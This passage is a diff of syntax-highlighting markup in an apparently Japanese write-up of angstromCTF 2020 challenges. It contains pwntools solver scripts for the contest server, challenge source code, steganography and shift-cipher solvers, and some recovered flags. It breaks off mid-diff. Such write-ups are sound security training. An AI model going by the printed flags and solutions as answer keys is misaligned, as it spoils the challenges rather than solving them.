@@ -146,7 +146,7 @@ clam<span style="color:#f92672">{</span>clam_clam_clam_clam_clam<span style="col
 <p><code>python</code>でサーバからの通信を受け取ってバイトのまま表示してみます。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;misc.2020.chall.actf.co&#39;</span>, <span style="color:#ae81ff">20204</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20204</span>)
 <span style="color:#66d9ef">while</span> True:
     data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
     <span style="color:#66d9ef">print</span>(data)
@@ -164,12 +164,12 @@ b<span style="color:#e6db74">&#39;clam{clam_clam_clam_clam_clam}\n&#39;</span>
 <p>上記メッセージを受け取ったら<code>clamclam</code>を返すようにプログラムを改良しましょう</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;misc.2020.chall.actf.co&#39;</span>, <span style="color:#ae81ff">20204</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20204</span>)
 
 <span style="color:#66d9ef">while</span> True:
     data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
-    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;clam{clam_clam_clam_clam_clam}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">and</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malc{malc_malc_malc_malc_malc}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
-        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;clamclam&#39;</span>)
+    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">clam{clam_clam_clam_clam_clam}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">and</span> data <span style="color:#f92672">!=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">malc{malc_malc_malc_malc_malc}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>:
+        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">clamclam</span><span style="color:#e6db74">&#39;</span>)
     <span style="color:#66d9ef">print</span>(data)
 </code></pre></div><p>フラグが返ってきました！！</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/CTF/angstrom# python3 calm.py 
@@ -226,46 +226,46 @@ See if you can decode what he sent to me. It's in actf{} format
 
 Find it on the shell server at /problems/2020/inputter/.
 </code></pre><p>まず問題のソースを見てみましょう</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define _GNU_SOURCE
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#</span><span style="color:#75715e">define _GNU_SOURCE</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
-<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+<span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define FLAGSIZE 128
+<span style="color:#75715e">#</span><span style="color:#75715e">define FLAGSIZE 128</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>() {
     gid_t gid <span style="color:#f92672">=</span> getegid();
     setresgid(gid, gid, gid);
-    FILE <span style="color:#f92672">*</span>file <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    FILE <span style="color:#f92672">*</span>file <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;</span>);
     <span style="color:#66d9ef">char</span> flag[FLAGSIZE];
-    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> NULL) {
-        printf(<span style="color:#e6db74">&#34;Cannot read flag file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">=</span><span style="color:#f92672">=</span> NULL) {
+        printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Cannot read flag file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
         exit(<span style="color:#ae81ff">1</span>);
     }
     fgets(flag, FLAGSIZE, file);
-    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, flag);
+    printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span>, flag);
 }
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
     setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
-    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>) {
-        puts(<span style="color:#e6db74">&#34;Your argument count isn&#39;t right.&#34;</span>);
+    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your argument count isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
         <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
     }
-    <span style="color:#66d9ef">if</span> (strcmp(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#34;\x07</span><span style="color:#e6db74">&#34;</span>)) {
-        puts(<span style="color:#e6db74">&#34;Your argument isn&#39;t right.&#34;</span>);
+    <span style="color:#66d9ef">if</span> (strcmp(argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#ae81ff">\x07</span><span style="color:#e6db74">&#34;</span>)) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your argument isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
         <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
     }
     <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
     fgets(buf, <span style="color:#ae81ff">128</span>, stdin);
-    <span style="color:#66d9ef">if</span> (strcmp(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x02\x03\n</span><span style="color:#e6db74">&#34;</span>)) {
-        puts(<span style="color:#e6db74">&#34;Your input isn&#39;t right.&#34;</span>);
+    <span style="color:#66d9ef">if</span> (strcmp(buf, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)) {
+        puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Your input isn&#39;t right.</span><span style="color:#e6db74">&#34;</span>);
         <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
     }
-    puts(<span style="color:#e6db74">&#34;You seem to know what you&#39;re doing.&#34;</span>);
+    puts(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">You seem to know what you&#39;re doing.</span><span style="color:#e6db74">&#34;</span>);
     print_flag();
 }
 </code></pre></div><p>値の比較をしている箇所が２つあります。
@@ -300,20 +300,20 @@ Important: Redownload the image if you have one from before 11:30 AM 3/14/20. Im
 <p>とりあえずソースを見てみましょう。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
 
-im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;breathe.jpg&#39;</span>)
-im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#34;breathe.jpg&#34;</span>)
+im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#39;</span>)
+im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#34;</span>)
 
 width, height <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>size
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;REDACT&#34;</span>
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">REDACT</span><span style="color:#e6db74">&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
 
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(i, d):
     i <span style="color:#f92672">=</span> list(str(i))
     i[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> d
 
-    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(i))
+    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(i))
     
 
 c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
@@ -324,45 +324,45 @@ c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
         <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> im<span style="color:#f92672">.</span>getpixel((i,j)):
             data<span style="color:#f92672">.</span>append(encode(a, flag[c <span style="color:#f92672">%</span> len(flag)]))
 
-            c<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+            c<span style="color:#f92672">+</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 
         im<span style="color:#f92672">.</span>putpixel((i,j), tuple(data))
         
-im<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;output.png&#34;</span>)
+im<span style="color:#f92672">.</span>save(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">output.png</span><span style="color:#e6db74">&#34;</span>)
 pixels <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>load()
 </code></pre></div><p>フラグの文字コードを文字列として繋げたものを鍵として使っているようです。</p>
 <p>こんな感じです。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;REDACT&#34;</span>
-<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
-<span style="color:#e6db74">&#39;826968656784&#39;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">REDACT</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([str(ord(i)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> flag])
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">826968656784</span><span style="color:#e6db74">&#39;</span>
 </code></pre></div><p>鍵は１桁ずつ使っているので必ず0~9の範囲であることが分かります。</p>
 <p>よって、元画像を0~9の総当たりで暗号化し、暗号化した画像と比べていけばフラグを復元できそうです。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> PIL <span style="color:#f92672">import</span> Image
-im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;breathe.jpg&#39;</span>)
-im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;output.png&#39;</span>)
+im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">breathe.jpg</span><span style="color:#e6db74">&#39;</span>)
+im2 <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">output.png</span><span style="color:#e6db74">&#39;</span>)
 width, height <span style="color:#f92672">=</span> im<span style="color:#f92672">.</span>size
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(i, d):
     i <span style="color:#f92672">=</span> list(str(i))
     i[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> d
-    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(i))
+    <span style="color:#66d9ef">return</span> int(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(i))
 
-flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
 <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(height):
     <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(width):
         <span style="color:#66d9ef">for</span> a,b <span style="color:#f92672">in</span> zip(im<span style="color:#f92672">.</span>getpixel((i,j)), im2<span style="color:#f92672">.</span>getpixel((i,j))):
-            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;0123456789&#39;</span>:
+            <span style="color:#66d9ef">for</span> s <span style="color:#f92672">in</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0123456789</span><span style="color:#e6db74">&#39;</span>:
                 <span style="color:#66d9ef">if</span> encode(a, s) <span style="color:#f92672">==</span> b:
-                    buf <span style="color:#f92672">+=</span> s
+                    buf <span style="color:#f92672">+</span><span style="color:#f92672">=</span> s
                     <span style="color:#66d9ef">if</span> len(buf) <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
                         buf <span style="color:#f92672">=</span> buf[<span style="color:#ae81ff">1</span>:]
 
-                    <span style="color:#66d9ef">if</span> ord(<span style="color:#e6db74">&#39;!&#39;</span>) <span style="color:#f92672">&lt;=</span> int(buf) <span style="color:#f92672">&lt;</span> ord(<span style="color:#e6db74">&#39;}&#39;</span>):
-                        flag <span style="color:#f92672">+=</span> chr(int(buf))
-                        buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-                    <span style="color:#66d9ef">elif</span> int(buf) <span style="color:#f92672">==</span> ord(<span style="color:#e6db74">&#39;}&#39;</span>):
-                        flag <span style="color:#f92672">+=</span> chr(int(buf))
+                    <span style="color:#66d9ef">if</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">!</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">&lt;</span><span style="color:#f92672">=</span> int(buf) <span style="color:#f92672">&lt;</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+                        flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(int(buf))
+                        buf <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
+                    <span style="color:#66d9ef">elif</span> int(buf) <span style="color:#f92672">==</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>):
+                        flag <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(int(buf))
 <span style="color:#66d9ef">print</span>(flag)
 </code></pre></div><p>綺麗にフラグが復元されるはずでしたが、関係ない文字列が大量にでてきてしまいました。</p>
 <p>フラグフォーマットである<code>actf</code>で検索すると、フラグが見つかりました！！</p>
@@ -386,9 +386,9 @@ Shift UUQWIZSFTWAAMYFCB by n=38
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shift_p</span>(enc, p):
-    dec <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    dec <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>
     <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> enc:
-        dec <span style="color:#f92672">+=</span> chr((ord(c) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> p) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74">&#39;A&#39;</span>))
+        dec <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr((ord(c) <span style="color:#f92672">-</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p) <span style="color:#f92672">%</span> <span style="color:#ae81ff">26</span> <span style="color:#f92672">+</span> ord(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>))
     <span style="color:#66d9ef">return</span> dec
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fib</span>(n):
@@ -402,14 +402,14 @@ Shift UUQWIZSFTWAAMYFCB by n=38
             a, b <span style="color:#f92672">=</span> b, a <span style="color:#f92672">+</span> b
         <span style="color:#66d9ef">return</span> b
 
-io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;misc.2020.chall.actf.co&#39;</span>, <span style="color:#ae81ff">20300</span>)
+io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">misc.2020.chall.actf.co</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">20300</span>)
 
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;--------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">--------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
 
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
-    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>)
     enc <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>]
-    shift <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;=&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]
+    shift <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">=</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]
     <span style="color:#66d9ef">print</span>(enc, shift)
     dec <span style="color:#f92672">=</span> shift_p(enc, fib(int(shift, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>))
     <span style="color:#66d9ef">print</span>(dec)
@@ -445,10 +445,10 @@ b<span style="color:#e6db74">&#39;actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}\n&#39;
                 <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">magic</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;please give flag&#34;</span>) {
                     <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/flag?msg=&#34;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">innerText</span>))
                         .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">res</span> =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>())
-                        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">txt</span> =&gt; <span style="color:#a6e22e">magic</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">txt</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">v</span> =&gt; String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xf</span>)).<span style="color:#a6e22e">join</span><span style="color:#e6db74">``</span>);
+                        .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">txt</span> =&gt; <span style="color:#a6e22e">magic</span>.<span style="color:#a6e22e">innerText</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">txt</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">`</span><span style="color:#e6db74">`</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">v</span> =&gt; String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xf</span>)).<span style="color:#a6e22e">join</span><span style="color:#e6db74">`</span><span style="color:#e6db74">`</span>);
                 }
             }, <span style="color:#ae81ff">1000</span>);
-        <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+        <span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#960050;background-color:#1e0010">s</span><span style="color:#960050;background-color:#1e0010">c</span><span style="color:#960050;background-color:#1e0010">r</span><span style="color:#960050;background-color:#1e0010">i</span><span style="color:#960050;background-color:#1e0010">p</span><span style="color:#960050;background-color:#1e0010">t</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
 </code></pre></div><p>どうやら<code>give flag</code>を<code>please give flag</code>にすれば良さそうです。</p>
 <p><img src="https://user-images.githubusercontent.com/50363796/77066944-75274c80-6a27-11ea-87b0-216fcba325f2.gif" alt="magic"></p>
 <p>フラグがでてきました！！</p>
@@ -556,33 +556,33 @@ Our insider leaked the source, but was &quot;terminated&quot; shortly thereafter
 
 
 dbconfig <span style="color:#f92672">=</span> {
-	<span style="color:#e6db74">&#34;host&#34;</span>:host,
-	<span style="color:#e6db74">&#34;user&#34;</span>:user,
-	<span style="color:#e6db74">&#34;passwd&#34;</span>:passwd,
-	<span style="color:#e6db74">&#34;database&#34;</span>:dbname
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">host</span><span style="color:#e6db74">&#34;</span>:host,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">user</span><span style="color:#e6db74">&#34;</span>:user,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">passwd</span><span style="color:#e6db74">&#34;</span>:passwd,
+	<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">database</span><span style="color:#e6db74">&#34;</span>:dbname
 }
 
 app <span style="color:#f92672">=</span> Flask(__name__)
-<span style="color:#e6db74">&#34;&#34;&#34;
-</span><span style="color:#e6db74">limiter = Limiter(
-</span><span style="color:#e6db74">	app,
-</span><span style="color:#e6db74">	key_func=get_remote_address,
-</span><span style="color:#e6db74">	default_limits=[&#34;1 per second&#34;],
-</span><span style="color:#e6db74">)&#34;&#34;&#34;</span>
+<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">limiter = Limiter(</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">	app,</span><span style="color:#e6db74">
